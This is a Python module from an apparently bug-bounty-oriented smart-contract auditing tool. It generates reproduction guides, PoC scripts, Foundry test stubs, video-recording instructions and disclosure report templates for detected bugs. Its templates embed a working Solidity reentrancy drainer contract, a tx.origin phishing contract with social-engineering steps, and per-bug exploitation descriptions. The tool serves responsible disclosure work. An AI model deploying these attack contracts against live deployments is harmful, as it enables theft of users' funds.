"""
Generates structured reproduction guides for each bug:
- Step-by-step exploit steps
- Proof-of-Concept script (Python/JS)
- Foundry test skeleton
- Video recording guide
- Official disclosure template
- Production impact description
"""

from __future__ import annotations
from torot.core.models import Bug, Severity, ReproductionGuide


# --------------------------------------------------------------------------- #
# Production path templates per bug type                                       #
# --------------------------------------------------------------------------- #
PRODUCTION_PATHS: dict[str, str] = {
    "reentrancy": (
        "In production, this vulnerability is triggered when an external user or contract "
        "calls the vulnerable withdraw/transfer function. The attacker deploys a malicious "
        "contract with a fallback function that re-enters the target before the balance is "
        "updated. This can be executed on any live deployment of this contract — the bug "
        "is exploitable immediately after deployment with no special privileges required."
    ),
    "tx-origin": (
        "In production, a phishing site or malicious contract tricks the legitimate owner "
        "into signing a transaction. Because tx.origin returns the original EOA signer "
        "rather than the immediate caller, the attacker's contract passes the auth check. "
        "This is exploitable on any mainnet/testnet deployment without needing any key."
    ),
    "suicidal": (
        "In production, any external caller can invoke the unguarded selfdestruct function. "
        "This permanently destroys the contract bytecode on-chain and sends all ETH to "
        "the caller. Once triggered, the contract address becomes an empty account — "
        "all integrations, user funds, and contract state are permanently lost."
    ),
    "integer overflow": (
        "In production, a crafted transaction with a large input value causes the arithmetic "
        "to wrap around to zero or a small number. This bypasses balance checks, enables "
        "minting unlimited tokens, or corrupts accounting. Exploitable on Solidity < 0.8 "
        "without SafeMath, or in any unchecked arithmetic block in 0.8+."
    ),
    "access control": (
        "In production, any address — not just the intended admin — can call privileged "
        "functions such as mint, pause, or upgrade. This gives an attacker full control "
        "over the protocol. Exploitable immediately after deployment by any on-chain actor."
    ),
    "timestamp": (
        "In production, miners can manipulate block.timestamp by up to ~15 seconds to "
        "influence time-dependent outcomes such as lottery results, unlock periods, or "
        "deadline checks. This gives a miner an unfair advantage and can be exploited "
        "on any live deployment."
    ),
    "default": (
        "In production, this vulnerability exists in the deployed contract bytecode. "
        "Depending on the specific conditions, it may be triggered by a malicious user, "
        "a crafted transaction, or an interaction with another contract. Review the "
        "description and the code location carefully to determine exploitability."
    ),
}


def _match_production_path(bug: Bug) -> str:
    key = (bug.bug_type + " " + bug.title + " " + bug.description).lower()
    for pattern, text in PRODUCTION_PATHS.items():
        if pattern in key:
            return text
    return PRODUCTION_PATHS["default"]


# --------------------------------------------------------------------------- #
# PoC script generator                                                         #
# --------------------------------------------------------------------------- #
def _build_poc_script(bug: Bug) -> str:
    contract_file = bug.file or "YourContract.sol"
    bug_lower = (bug.bug_type + bug.title + bug.description).lower()

    if "reentrancy" in bug_lower:
        return f'''\
# Proof-of-Concept: Reentrancy exploit
# File: {contract_file}  Line: {bug.line}
# Run with: python poc.py

from web3 import Web3

RPC_URL    = "http://localhost:8545"           # replace with your RPC
PRIVATE_KEY = "0x..."                          # attacker private key
TARGET     = "0x..."                           # deployed contract address

ATTACKER_CONTRACT = """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerable {{
    function withdraw(uint256 amount) external;
    function deposit() external payable;
}}

contract ReentrancyAttacker {{
    IVulnerable public target;
    address public owner;

    constructor(address _target) {{
        target = IVulnerable(_target);
        owner  = msg.sender;
    }}

    function attack() external payable {{
        target.deposit{{value: msg.value}}();
        target.withdraw(msg.value);
    }}

    receive() external payable {{
        if (address(target).balance >= msg.value) {{
            target.withdraw(msg.value);    // re-enter before state update
        }}
    }}

    function drain() external {{
        payable(owner).transfer(address(this).balance);
    }}
}}
"""

w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = w3.eth.account.from_key(PRIVATE_KEY)
print(f"Attacker: {{account.address}}")
print(f"Target balance before: {{w3.eth.get_balance(TARGET)}} wei")
# TODO: compile and deploy ATTACKER_CONTRACT, call attack(), call drain()
print("Deploy the attacker contract above and call attack() with some ETH.")
'''

    elif "tx.origin" in bug_lower or "tx-origin" in bug_lower:
        return f'''\
# Proof-of-Concept: tx.origin phishing
# File: {contract_file}  Line: {bug.line}

PHISHING_CONTRACT = """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerable {{
    function adminAction() external;
}}

contract PhishingAttack {{
    IVulnerable public target;

    constructor(address _target) {{
        target = IVulnerable(_target);
    }}

    // Trick the owner into calling this function
    // (e.g. via a fake airdrop or NFT mint site)
    function collectReward() external {{
        target.adminAction();   // tx.origin == original owner -> passes check
    }}
}}
"""

print("Deploy PhishingAttack pointing at the target.")
print("Then social-engineer the owner wallet into calling collectReward().")
print("Because tx.origin == owner, the target contract's auth check passes.")
'''

    else:
        return f'''\
# Proof-of-Concept: {bug.title}
# File: {contract_file}  Line: {bug.line}
# Tool: {bug.tool}

# Generic PoC skeleton — adapt for your specific environment.

from web3 import Web3

RPC_URL     = "http://localhost:8545"
PRIVATE_KEY = "0x..."
TARGET      = "0x..."

w3       = Web3(Web3.HTTPProvider(RPC_URL))
account  = w3.eth.account.from_key(PRIVATE_KEY)

# TODO: load ABI, instantiate contract, craft the exploit call
# contract = w3.eth.contract(address=TARGET, abi=ABI)
# tx = contract.functions.vulnerableFunction(crafted_input).build_transaction(...)

print("Adapt this skeleton to call the vulnerable function with malicious input.")
print(f"Bug description: {bug.description[:120]}")
'''


# --------------------------------------------------------------------------- #
# Foundry test generator                                                       #
# --------------------------------------------------------------------------- #
def _build_foundry_test(bug: Bug) -> str:
    safe_title = bug.title.replace("[", "").replace("]", "").replace(" ", "_")
    contract_file = bug.file or "YourContract.sol"

    return f'''\
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Foundry test for: {bug.title}
// File: {contract_file}  Line: {bug.line}
// Run: forge test --match-test test_{safe_title} -vvvv

import "forge-std/Test.sol";
// import "../src/{contract_file.split("/")[-1]}";  // uncomment and adjust

contract Test_{safe_title} is Test {{

    // TODO: replace with actual contract type
    // YourContract target;

    function setUp() public {{
        // Deploy or fork the target
        // target = new YourContract();
        // vm.deal(address(target), 10 ether);
    }}

    function test_{safe_title}() public {{
        /*
         * BUG: {bug.title}
         * Severity: {bug.severity.value}
         * Description: {bug.description[:200]}
         *
         * Reproduce:
{chr(10).join("         * " + s for s in (bug.reproduction.steps if bug.reproduction else ["TODO: fill in exploit steps"]))}
         */

        // TODO: implement the exploit
        // e.g. for reentrancy:
        //   AttackerContract attacker = new AttackerContract(address(target));
        //   attacker.attack{{value: 1 ether}}();
        //   assertGt(address(attacker).balance, 1 ether, "Exploit succeeded");

        assertTrue(false, "TODO: implement test body");
    }}
}}
'''


# --------------------------------------------------------------------------- #
# Video recording guide                                                        #
# --------------------------------------------------------------------------- #
def _build_video_guide(bug: Bug) -> str:
    return f'''\
VIDEO RECORDING GUIDE — {bug.title}
Severity: {bug.severity.value}
Location: {bug.location}
{'=' * 60}

PURPOSE
-------
This recording demonstrates the vulnerability to the project team or
bug bounty platform (Immunefi, Code4rena, Sherlock, HackerOne, etc.).
A clear video significantly increases the chance of a valid, paid report.

RECOMMENDED TOOLS
-----------------
  - OBS Studio      https://obsproject.com         (free, cross-platform)
  - asciinema       https://asciinema.org           (terminal-only recording)
  - Loom             https://loom.com               (quick sharing)

RECORDING SETUP
---------------
1. Split your screen into two halves:
   Left  — code editor showing {bug.file or "the vulnerable file"} at line {bug.line or "N/A"}
   Right — terminal running the PoC or Foundry test

2. Set resolution to 1920x1080 minimum.
3. Enable microphone if you plan to add voice commentary (recommended).

SCRIPT (what to show in order)
-------------------------------
Step 1  — Show the repository and explain the scope.
          "This is the {bug.file or "contract"} file.
           I am looking at line {bug.line or "N/A"}."

Step 2  — Highlight the vulnerable code snippet.
          Read the relevant lines aloud or annotate with an arrow.

Step 3  — Explain the vulnerability in plain English.
          "{bug.description[:300]}"

Step 4  — Show the PoC script / Foundry test.
          Walk through each step of the exploit.

Step 5  — Run the exploit live.
          `forge test --match-test test_{bug.title.replace(" ","_")} -vvvv`
          OR
          `python poc.py`
          Show the terminal output confirming the bug.

Step 6  — Show the impact.
          "{bug.impact or "Describe funds at risk, data loss, or contract takeover."}"

Step 7  — Briefly show the recommended fix.

AFTER RECORDING
---------------
- Export as MP4 (H.264) at 1080p.
- Upload to a private YouTube link OR attach directly to the bug report.
- Keep the raw footage — platforms may ask for additional evidence.

TIPS
----
- Keep it under 5 minutes. Reviewers watch many submissions.
- Show the exploit working, not just the code. Proof > description.
- If the exploit requires a fork, use: forge test --fork-url $RPC_URL
'''


# --------------------------------------------------------------------------- #
# Disclosure template                                                          #
# --------------------------------------------------------------------------- #
def _build_disclosure_template(bug: Bug) -> str:
    return f'''\
VULNERABILITY DISCLOSURE REPORT
================================
Title:     {bug.title}
Severity:  {bug.severity.value}
Tool:      {bug.tool}
File:      {bug.location}
Date:      [INSERT DATE]
Reporter:  [YOUR NAME / HANDLE]
Platform:  [Immunefi / Code4rena / Sherlock / HackerOne / Direct]

------------------------------------------------------------------------
SUMMARY
------------------------------------------------------------------------
{bug.description}

------------------------------------------------------------------------
VULNERABILITY DETAILS
------------------------------------------------------------------------
Type:     {bug.bug_type or "Smart Contract Vulnerability"}
Location: {bug.location}

Vulnerable Code:
{bug.code_snippet or "[paste the vulnerable code snippet here]"}

------------------------------------------------------------------------
IMPACT
------------------------------------------------------------------------
{bug.impact or "[Describe: what can an attacker do? Funds stolen? Contract destroyed? Governance hijacked?]"}

Production Exposure:
{bug.production_path or "[Describe how the bug manifests in the live deployment]"}

Affected Assets:
  - Contract: [CONTRACT ADDRESS on mainnet/testnet]
  - Network:  [Ethereum Mainnet / Arbitrum / Polygon / ...]
  - Funds at Risk: [Estimate in USD if applicable]

------------------------------------------------------------------------
PROOF OF CONCEPT
------------------------------------------------------------------------
Reproduction Steps:
{chr(10).join(f"  {i+1}. {s}" for i, s in enumerate(bug.reproduction.steps if bug.reproduction else ["[step 1]", "[step 2]"]))}

Test Command:
  forge test --match-test test_{bug.title.replace(" ","_")} -vvvv

Expected Result:
  [Describe the normal / expected behavior]

Actual Result:
  [Describe what actually happens — include transaction hash or test output]

------------------------------------------------------------------------
FIX / RECOMMENDATION
------------------------------------------------------------------------
{bug.fix_suggestion or "[Describe the recommended fix]"}

------------------------------------------------------------------------
REFERENCES
------------------------------------------------------------------------
{chr(10).join("  - " + r for r in bug.references) if bug.references else "  - [add relevant SWC/CVE/audit references]"}

------------------------------------------------------------------------
DISCLOSURE TIMELINE
------------------------------------------------------------------------
  [DATE] — Vulnerability discovered
  [DATE] — Report submitted to project team
  [DATE] — Project team acknowledged
  [DATE] — Fix deployed
  [DATE] — Public disclosure

------------------------------------------------------------------------
ATTACHMENTS
------------------------------------------------------------------------
  - poc.py            (Proof-of-Concept exploit script)
  - test_exploit.sol  (Foundry test)
  - recording.mp4     (Video demonstration)
'''


# --------------------------------------------------------------------------- #
# Public API: attach reproduction to every bug                                 #
# --------------------------------------------------------------------------- #
def build_reproduction_guide(bug: Bug) -> ReproductionGuide:
    """Build a full ReproductionGuide for a bug and attach production_path."""

    steps = _generate_steps(bug)
    guide = ReproductionGuide(
        steps=steps,
        poc_script=_build_poc_script(bug),
        foundry_test=_build_foundry_test(bug),
        video_guide=_build_video_guide(bug),
        disclosure_template=_build_disclosure_template(bug),
        environment_setup=(
            "Requirements:\n"
            "  - Node.js >= 18 and npm\n"
            "  - Python >= 3.9 and pip\n"
            "  - Foundry (forge/cast/anvil)  https://book.getfoundry.sh\n"
            "  - Web3.py: pip install web3\n"
            "  - A local or forked EVM node (Anvil or Hardhat)\n\n"
            "Start local node:\n"
            "  anvil --fork-url https://eth-mainnet.alchemyapi.io/v2/YOUR_KEY\n"
        ),
        expected_output=(
            f"The exploit demonstrates: {bug.impact or bug.description[:200]}"
        ),
    )
    return guide


def _generate_steps(bug: Bug) -> list[str]:
    key = (bug.bug_type + bug.title + bug.description).lower()

    if "reentrancy" in key:
        return [
            f"Clone the repository and install dependencies.",
            f"Deploy the target contract ({bug.file or 'contract'}) to a local Anvil fork.",
            "Deploy the ReentrancyAttacker contract from poc.py or the Foundry test.",
            "Call attack() on the attacker contract with 1 ETH.",
            "Observe that the attacker contract drains the target's full ETH balance.",
            "Call drain() to retrieve stolen funds to the attacker EOA.",
            "Confirm target balance is now 0 and attacker balance increased.",
        ]
    elif "tx.origin" in key or "tx-origin" in key:
        return [
            "Deploy the vulnerable contract.",
            "Deploy the PhishingAttack contract pointing at the target.",
            "From the owner's wallet, call collectReward() on the phishing contract.",
            "Observe the target's auth check passes because tx.origin == owner.",
            "Confirm the attacker gains admin access despite not being the direct caller.",
        ]
    elif "suicidal" in key:
        return [
            "Deploy the vulnerable contract with some ETH.",
            "From any external wallet (not the owner), call the selfdestruct function.",
            "Observe the contract is destroyed and ETH transferred to caller.",
            "Confirm the contract address is now empty on-chain.",
        ]
    elif "overflow" in key or "underflow" in key:
        return [
            "Deploy the vulnerable contract.",
            "Call the vulnerable arithmetic function with a crafted large input (e.g. 2^256-1).",
            "Observe the result wraps to an unexpected value.",
            "Confirm balances or supply are now incorrect.",
        ]
    else:
        return [
            f"Deploy the contract from {bug.file or 'the source file'}.",
            "Identify the vulnerable function at the specified line.",
            "Craft an input or call sequence that triggers the issue.",
            "Observe the unexpected or malicious outcome.",
            "Confirm the bug using the Foundry test or PoC script.",
        ]


def enrich_bugs_with_reproduction(bugs: list[Bug]) -> list[Bug]:
    """Attach ReproductionGuide and production_path to every bug in-place."""
    for bug in bugs:
        bug.reproduction = build_reproduction_guide(bug)
        bug.production_path = _match_production_path(bug)
    return bugs
